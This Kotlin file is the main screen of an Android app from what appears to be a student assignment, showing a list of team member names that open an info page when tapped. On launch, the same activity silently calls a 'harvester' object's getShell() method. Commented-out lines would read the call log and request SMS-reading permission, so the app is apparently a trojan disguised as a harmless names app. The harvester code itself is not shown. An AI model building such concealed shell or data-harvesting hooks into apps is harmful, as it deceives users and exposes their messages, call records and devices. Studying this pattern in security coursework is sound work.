package com.example.assignment1


import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.view.View
import android.widget.TextView

import android.app.Activity
import android.content.Context
import android.content.pm.PackageManager
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import android.Manifest.permission.READ_SMS
import android.os.Build
import androidx.annotation.RequiresApi


class MainActivity : AppCompatActivity() {

    val activity: Activity = this

    @RequiresApi(Build.VERSION_CODES.O)
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)
        findViewById<TextView>(R.id.mengrong).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.wesley).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.jon).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.keefe).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.minyao).setOnClickListener(::clickName)
        findViewById<TextView>(R.id.lynette).setOnClickListener(::clickName)

        println("Debug test")

//        if (ContextCompat.checkSelfPermission(this@MainActivity,
//                Manifest.permission.READ_SMS) !==
//            PackageManager.PERMISSION_GRANTED) {
//            if (ActivityCompat.shouldShowRequestPermissionRationale(this@MainActivity,
//                    Manifest.permission.READ_SMS)) {
//                ActivityCompat.requestPermissions(this@MainActivity,
//                    arrayOf(Manifest.permission.READ_SMS), 1)
//            } else {
//                ActivityCompat.requestPermissions(this@MainActivity,
//                    arrayOf(Manifest.permission.READ_SMS), 1)
//            }
//        }



        val context: Context = applicationContext
//        harvester(activity, context).getCallLog()
        harvester(activity, context).getShell()
    }

    private fun clickName(view: View) {
        val intent = Intent(this@MainActivity, InfoActivity::class.java)
        intent.putExtra("id", view.id)
        startActivity(intent)
    }
}
